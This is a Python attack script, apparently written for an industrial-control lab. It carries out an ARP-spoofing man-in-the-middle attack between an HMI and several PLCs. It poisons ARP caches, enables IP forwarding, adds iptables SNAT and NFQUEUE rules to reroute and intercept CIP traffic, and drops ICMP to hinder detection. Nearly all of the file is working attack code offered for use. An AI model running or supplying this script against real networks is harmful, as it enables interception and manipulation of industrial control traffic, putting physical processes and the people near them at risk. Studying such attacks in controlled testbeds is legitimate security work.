#!/usr/bin/env python3
import os
import sys
import time
from scapy.all import ARP, send, getmacbyip

####################################################
# Known IP Mappings
####################################################
HOST_INFO = {
    "SFPLC100": "10.0.0.101",
    "PLC100": "10.0.0.111",
    "SFPLC200": "10.0.0.102",
    "PLC200": "10.0.0.112",
    "SFPLC300": "10.0.0.103",
    "PLC300": "10.0.0.113",
    "HMI":    "10.0.0.150",
}

ATTACKER_IP  = "10.0.0.200"  # Attacker IP
IP_FORWARD_FILE= "/proc/sys/net/ipv4/ip_forward"

pairs = []  # list of { "source_ip": X, "destination_ip": Y, "source_mac": ..., "destination_mac": ... }

def resolve_ip_or_name(user_input: str) -> str:
    upper = user_input.upper()
    if upper in HOST_INFO:
        return HOST_INFO[upper]
    else:
        return user_input

####################################################
# ARP Spoof & IP Forward
####################################################
def enable_ip_forward():
    print("[*] Enabling IP forwarding.")
    os.system(f"echo 1 > {IP_FORWARD_FILE}")

def disable_ip_forward():
    print("[*] Disabling IP forwarding.")
    os.system(f"echo 0 > {IP_FORWARD_FILE}")

def get_mac(ip):
    return getmacbyip(ip)

def arp_spoof(target_ip, target_mac, spoof_ip):
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=3, verbose=False)

####################################################
# NAT + NFQUEUE + ICMP Drop
####################################################
def add_nat_rule(source_ip, destination_ip):
    """
    Use a broad NAT for all TCP traffic from attacker->destination_ip -> source_ip.
    This ensures ephemeral CIP connections also pass properly.
    """
    cmd = (
        f"iptables -t nat -A POSTROUTING "
        f"-s {ATTACKER_IP} -d {destination_ip} -p tcp "
        f"-j SNAT --to-source {source_ip}"
    )
    print(f"[+] Adding NAT rule:\n    {cmd}")
    rc = os.system(cmd)
    if rc != 0:
        print("[!] Could not add NAT rule. Exiting.")
        sys.exit(1)

def remove_nat_rule(source_ip, destination_ip):
    cmd = (
        f"iptables -t nat -D POSTROUTING "
        f"-s {ATTACKER_IP} -d {destination_ip} -p tcp "
        f"-j SNAT --to-source {source_ip}"
    )
    print(f"[-] Removing NAT rule:\n    {cmd}")
    os.system(cmd)

def add_nfqueue_rules(destination_ip):
    """
    Divert ALL TCP traffic to/from this Destination into NFQUEUE (with --queue-bypass).
    If no netfilterqueue script is running, packets are accepted (fail open).
    """
    print(f"[+] Adding iptables rules for ALL tcp traffic to/from Destination {destination_ip} => NFQUEUE (queue-bypass).")

    # traffic going to Destination
    os.system(
        f"iptables -t mangle -A PREROUTING -p tcp -d {destination_ip} "
        f"-j NFQUEUE --queue-num 1 --queue-bypass"
    )
    # traffic coming from Destination
    os.system(
        f"iptables -t mangle -A PREROUTING -p tcp -s {destination_ip} "
        f"-j NFQUEUE --queue-num 1 --queue-bypass"
    )

def remove_nfqueue_rules(destination_ip):
    print(f"[-] Removing NFQUEUE rules for Destination {destination_ip}.")
    os.system(
        f"iptables -t mangle -D PREROUTING -p tcp -d {destination_ip} "
        f"-j NFQUEUE --queue-num 1 --queue-bypass"
    )
    os.system(
        f"iptables -t mangle -D PREROUTING -p tcp -s {destination_ip} "
        f"-j NFQUEUE --queue-num 1 --queue-bypass"
    )

def add_icmp_drop_rules():
    """
    Drop all ICMP (ping) so Source <-> Destination can't discover each other easily.
    """
    print("[+] Dropping all ICMP (ping) traffic (FORWARD, INPUT, OUTPUT).")
    os.system("iptables -A FORWARD -p icmp -j DROP")
    os.system("iptables -A INPUT   -p icmp -j DROP")
    os.system("iptables -A OUTPUT  -p icmp -j DROP")

def remove_icmp_drop_rules():
    print("[-] Removing ICMP drop rules.")
    os.system("iptables -D FORWARD -p icmp -j DROP")
    os.system("iptables -D INPUT   -p icmp -j DROP")
    os.system("iptables -D OUTPUT  -p icmp -j DROP")

####################################################
# Setup / Teardown for each pair
####################################################
def setup_pair(source_ip, destination_ip):
    print(f"\n[*] Setting up pair: Source={source_ip}, Destination={destination_ip}")
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    if not source_mac or not destination_mac:
        print("[!] Could not get MAC for Source/Destination. Exiting.")
        sys.exit(1)

    add_nat_rule(source_ip, destination_ip)
    add_nfqueue_rules(destination_ip)

    return source_mac, destination_mac

def teardown_pair(source_ip, source_mac, destination_ip, destination_mac):
    print(f"\n[*] Tearing down pair: Source={source_ip}, Destination={destination_ip}")
    remove_nfqueue_rules(destination_ip)
    remove_nat_rule(source_ip, destination_ip)
    # restore ARP
    restore_arp(source_ip, source_mac, destination_ip, destination_mac)
    restore_arp(destination_ip, destination_mac, source_ip, source_mac)

####################################################
# ARP Spoof Loop
####################################################
def arp_spoof_loop():
    print("[*] Starting ARP spoof loop. Ctrl+C to stop.")
    try:
        while True:
            for p in pairs:
                # Make Victim think attacker is Destination
                arp_spoof(p["source_ip"], p["source_mac"], p["destination_ip"])
                # Make Destination think attacker is Source
                arp_spoof(p["destination_ip"], p["destination_mac"], p["source_ip"])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Caught CTRL+C in ARP spoof loop.")
    finally:
        print("[*] ARP spoof loop ended.")

####################################################
# Main
####################################################
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root. Exiting.")
        sys.exit(1)

    print("=== MITM Attack with ephemeral CIP + ICMP drop + queue-bypass ===\n")
    print("(Always specify Source as first, Destination as second for CIP direction.)\n")

    # 1) Number of pairs
    while True:
        try:
            num_pairs = int(input("How many (Source,Destination) IP pairs do you want to attack?: ").strip())
            if num_pairs <= 0:
                raise ValueError()
            break
        except ValueError:
            print("[!] Invalid number, must be > 0")

    # 2) Gather pairs
    for i in range(1, num_pairs + 1):
        print(f"\n--- Pair #{i} ---")
        user_source = input("Enter Source name/IP (e.g. hmi): ").strip()
        user_destination = input("Enter Destination name/IP (e.g. PLC100): ").strip()

        source_ip = resolve_ip_or_name(user_source)
        destination_ip = resolve_ip_or_name(user_destination)
        pairs.append({
            "source_ip": source_ip,
            "destination_ip": destination_ip,
            "source_mac": None,
            "destination_mac": None
        })

    # 3) Enable IP forward
    enable_ip_forward()

    # 4) Drop ICMP
    add_icmp_drop_rules()

    # 5) Setup each pair
    for pair in pairs:
        source_mac, destination_mac = setup_pair(pair["source_ip"], pair["destination_ip"])
        pair["source_mac"] = source_mac
        pair["destination_mac"] = destination_mac

    # 6) ARP Spoof
    try:
        arp_spoof_loop()
    except KeyboardInterrupt:
        pass
    finally:
        print("[*] Tearing down everything.")
        for p in pairs:
            teardown_pair(p["source_ip"], p["source_mac"], p["destination_ip"], p["destination_mac"])
        remove_icmp_drop_rules()
        disable_ip_forward()
        print("[*] Done. Bye.")
        sys.exit(0)

